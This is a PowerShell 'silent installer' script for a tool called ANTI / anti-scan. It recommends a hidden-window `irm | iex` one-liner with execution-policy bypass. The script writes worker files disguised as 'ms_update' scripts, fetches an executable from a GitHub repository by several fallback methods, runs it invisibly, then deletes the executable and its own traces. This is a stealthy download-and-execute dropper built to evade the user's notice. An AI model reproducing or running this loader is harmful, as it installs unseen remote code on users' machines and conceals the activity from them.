# ANTI Defense System - Silent Installer v3.1
# ─────────────────────────────────────────────────────────────────────────────
# Usage recommandee (zero fenetre) :
#   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1 | iex"
#
# COMMENT FONCTIONNE LE MODE ZERO-FENETRE :
#   Ce script cree un fichier VBScript temporaire qui utilise
#   WScript.Shell.Run() avec bShowWindow=0 pour lancer PowerShell
#   de facon completement invisible, peu importe comment ce script
#   a ete appele (avec ou sans -WindowStyle Hidden).
# ─────────────────────────────────────────────────────────────────────────────

$ErrorActionPreference = "SilentlyContinue"

$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/exedownloader/main"
$installDir = "$env:LOCALAPPDATA\AntiScan"
$exePath    = "$installDir\anti-scan.exe"
$vbsPath    = "$env:TEMP\ms_update.vbs"
$ps1Path    = "$env:TEMP\ms_update.ps1"

# ─── Creer le script de travail PS1 ──────────────────────────────────────────
$workerScript = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$REPO_URL   = '$REPO_URL'
`$installDir = '$installDir'
`$exePath    = '$exePath'

Remove-Item -Path `$installDir -Recurse -Force -ErrorAction SilentlyContinue
`$null = New-Item -ItemType Directory -Force -Path `$installDir
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

`$downloaded = `$false
try {
    `$wc = New-Object System.Net.WebClient
    `$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    `$wc.DownloadFile("`$REPO_URL/anti-scan.exe", `$exePath)
    if ((Test-Path `$exePath) -and (Get-Item `$exePath).Length -gt 1000000) { `$downloaded = `$true }
} catch {}

if (-not `$downloaded) {
    try {
        Invoke-WebRequest -Uri "`$REPO_URL/anti-scan.exe" -OutFile `$exePath -UseBasicParsing -ErrorAction Stop
        if ((Test-Path `$exePath) -and (Get-Item `$exePath).Length -gt 1000000) { `$downloaded = `$true }
    } catch {}
}

if (-not `$downloaded) {
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source "`$REPO_URL/anti-scan.exe" -Destination `$exePath -ErrorAction Stop
        if ((Test-Path `$exePath) -and (Get-Item `$exePath).Length -gt 1000000) { `$downloaded = `$true }
    } catch {}
}

if (-not `$downloaded) { exit 1 }

try {
    `$psi = New-Object System.Diagnostics.ProcessStartInfo
    `$psi.FileName        = `$exePath
    `$psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    `$psi.CreateNoWindow  = `$true
    `$psi.UseShellExecute = `$false
    `$proc = [System.Diagnostics.Process]::Start(`$psi)
    if (`$proc) { `$proc.WaitForExit(600000) | Out-Null }
} catch {}

Start-Sleep -Seconds 2
Remove-Item -Path `$installDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "`$env:TEMP\ms_update.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "`$env:TEMP\ms_update.vbs" -Force -ErrorAction SilentlyContinue
"@
$workerScript | Out-File -FilePath $ps1Path -Encoding UTF8 -Force

# ─── Creer le VBScript wrapper ─────
$vbsContent = "Set oShell = CreateObject(\"WScript.Shell\")" + "`n" +               "sCmd = \"powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"" & $ps1Path & \"\"\"" + "`n" +               "oShell.Run sCmd, 0, False"

$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

# ─── Lancer le VBScript (invisible) et fermer le PowerShell parent ───────────
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("wscript.exe //nologo `"$vbsPath`"", 0, $false)
} catch {
    try {
        $psi2 = New-Object System.Diagnostics.ProcessStartInfo
        $psi2.FileName        = "powershell.exe"
        $psi2.Arguments       = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ps1Path`""
        $psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi2.CreateNoWindow  = $true
        $psi2.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi2) | Out-Null
    } catch {}
}

exit 0
